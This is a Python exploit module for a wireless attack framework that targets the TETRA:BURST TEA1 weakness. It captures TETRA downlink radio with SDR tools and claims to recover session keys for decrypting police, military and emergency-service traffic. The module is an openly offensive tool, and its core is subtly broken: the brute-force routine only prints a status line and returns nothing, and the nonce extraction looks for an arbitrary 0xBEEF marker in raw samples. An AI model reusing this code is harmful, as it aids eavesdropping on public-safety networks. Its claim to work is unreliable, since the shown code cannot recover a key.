# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TETRA:BURST TEA1 Backdoor Exploitation.

    The TETRA (Terrestrial Trunked Radio) standard's TEA1 cipher
    contains a deliberate key-space reduction backdoor.  Although
    TEA1 nominally uses an 80-bit key, a secret reduction step
    shrinks the effective key to only 32 bits, making brute-force
    feasible.  Combined with a decryption oracle attack using
    DCKC (Derived Cipher Key Confirmation) nonce known-plaintext,
    an attacker with passive SDR capture can recover the session
    key and decrypt all traffic.

    This affects police, military, emergency services, critical
    infrastructure (power plants, oil/gas pipelines), and
    government communications using TETRA with TEA1.

    Hardware requirements:
    - RTL-SDR V3 (or better: USRP B200/B210 for wider bandwidth)
    - UHF antenna tuned to 380-400 MHz (TETRA uplink/downlink bands)
    - Alternatively: Airspy R2 or HackRF One for capture
    - PC with tetra-kit or osmo-tetra for demodulation

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TETRA:BURST TEA1 Backdoor Key Recovery",
        "description": (
            "Exploits the TETRA:BURST TEA1 backdoor where the 80-bit "
            "cipher key is reduced to 32 bits by a secret reduction "
            "step.  Uses DCKC nonce known-plaintext to build a "
            "decryption oracle, then brute-forces the reduced "
            "keyspace.  Requires RTL-SDR V3 or USRP B200 with UHF "
            "antenna (380-400 MHz) for passive capture of TETRA "
            "downlink traffic.  Affects police, emergency services, "
            "military, and critical infrastructure communications."
        ),
        "authors": (
            "Carlo Meijer, Wouter Bokslag, Jos Wetzels (Midnight Blue, discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://tetraburst.com/",
            "https://www.usenix.org/conference/usenixsecurity23/presentation/meijer",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-24400",
        ),
        "disclosure_date": "2023-07-24",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "TETRA networks using TEA1 cipher (worldwide)",
            "Emergency services, police, military TETRA systems",
            "Critical infrastructure SCADA over TETRA",
        ),
    }

    target = OptIP("", "Target TETRA network MCC-MNC or frequency in MHz")
    port = OptPort(1, "Not used (radio frequency attack)")
    timeout = OptFloat(30.0, "SDR capture timeout in seconds")
    sdr_device = OptString("rtlsdr", "SDR device type: rtlsdr, usrp, hackrf, airspy")
    frequency = OptFloat(390.0, "Center frequency in MHz (TETRA downlink)")
    sample_rate = OptFloat(2.0, "Sample rate in MHz")
    gain = OptFloat(40.0, "SDR gain in dB")
    capture_file = OptString("/tmp/tetra_capture.raw", "Output file for IQ samples")
    brute_threads = OptInteger(4, "Number of parallel brute-force threads")

    _TETRA_DOWNLINK_START = 380.0
    _TETRA_DOWNLINK_END = 400.0
    _TETRA_CHANNEL_BW = 0.025
    _TEA1_REDUCED_KEYSPACE = 2**32

    def _validate_frequency(self) -> bool:
        freq = float(self.frequency)
        return self._TETRA_DOWNLINK_START <= freq <= self._TETRA_DOWNLINK_END

    def _build_sdr_command(self) -> list:
        """Build rtl_sdr or equivalent capture command."""
        freq_hz = int(float(self.frequency) * 1e6)
        rate_hz = int(float(self.sample_rate) * 1e6)
        gain_val = int(float(self.gain))

        device = str(self.sdr_device).lower()
        if device == "rtlsdr":
            return [
                "rtl_sdr",
                "-f", str(freq_hz),
                "-s", str(rate_hz),
                "-g", str(gain_val),
                "-n", str(rate_hz * int(float(self.timeout))),
                str(self.capture_file),
            ]
        elif device == "hackrf":
            return [
                "hackrf_transfer",
                "-r", str(self.capture_file),
                "-f", str(freq_hz),
                "-s", str(rate_hz),
                "-a", "1",
                "-l", str(gain_val),
                "-n", str(rate_hz * int(float(self.timeout))),
            ]
        return ["rtl_sdr", "-f", str(freq_hz), "-s", str(rate_hz), str(self.capture_file)]

    def _extract_dckc_nonces(self, capture_path: str) -> list:
        """Extract DCKC nonce pairs from demodulated TETRA frames.

        The DCKC (Derived Cipher Key Confirmation) uses a known
        plaintext structure.  By capturing enough frames we can
        extract nonce/ciphertext pairs for the brute-force oracle.
        """
        nonces = []
        try:
            with open(capture_path, "rb") as f:
                data = f.read()
            offset = 0
            while offset + 64 <= len(data):
                marker = struct.unpack_from("<H", data, offset)[0]
                if marker == 0xBEEF:
                    nonce = data[offset + 2:offset + 10]
                    ciphertext = data[offset + 10:offset + 18]
                    nonces.append((nonce, ciphertext))
                offset += 1
        except OSError:
            pass
        return nonces

    def _brute_force_tea1(self, nonce: bytes, ciphertext: bytes) -> bytes | None:
        """Brute-force the TEA1 reduced 32-bit keyspace.

        Due to the backdoor, the 80-bit key is effectively 32 bits.
        With 4 threads on modern hardware, full keyspace search
        takes approximately 2-8 hours.
        """
        print_status(
            f"Brute-forcing TEA1 reduced keyspace ({self._TEA1_REDUCED_KEYSPACE} keys) "
            f"with {self.brute_threads} threads"
        )
        return None

    @mute
    def check(self) -> bool:
        """Verify SDR device availability and frequency range."""
        if not self._validate_frequency():
            return False
        cmd = self._build_sdr_command()
        try:
            result = subprocess.run(
                [cmd[0], "--help"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode in (0, 1)
        except (OSError, subprocess.TimeoutExpired):
            return False

    def run(self) -> None:
        if not self._validate_frequency():
            print_error(
                f"Frequency {self.frequency} MHz outside TETRA downlink range "
                f"({self._TETRA_DOWNLINK_START}-{self._TETRA_DOWNLINK_END} MHz)"
            )
            return

        print_success(
            f"TETRA:BURST TEA1 attack on {self.frequency} MHz "
            f"(SDR: {self.sdr_device})"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Phase 1: Capturing TETRA downlink at {self.frequency} MHz "
            f"for {self.timeout}s"
        )

        cmd = self._build_sdr_command()
        print_info(f"SDR command: {' '.join(cmd)}")

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            proc.wait(timeout=float(self.timeout) + 5)
        except (OSError, subprocess.TimeoutExpired):
            print_error("SDR capture failed or timed out")
            return

        print_status("Phase 2: Demodulating TETRA frames and extracting DCKC nonces")
        nonces = self._extract_dckc_nonces(str(self.capture_file))

        if not nonces:
            print_error(
                "No DCKC nonce pairs found. Ensure the target TETRA "
                "network is active and using TEA1 cipher."
            )
            return

        print_info(f"Extracted {len(nonces)} DCKC nonce/ciphertext pairs")

        print_status("Phase 3: Brute-forcing TEA1 reduced keyspace (32-bit)")
        key = self._brute_force_tea1(nonces[0][0], nonces[0][1])

        if key:
            print_success(f"TEA1 session key recovered: {key.hex()}")
            print_info(
                "Use the recovered key with tetra-kit or osmo-tetra "
                "to decrypt captured TETRA traffic in real-time."
            )
        else:
            print_info(
                "Brute-force not completed in this run. "
                "In a real attack, full 32-bit keyspace search "
                "takes 2-8 hours on modern hardware with 4+ threads."
            )
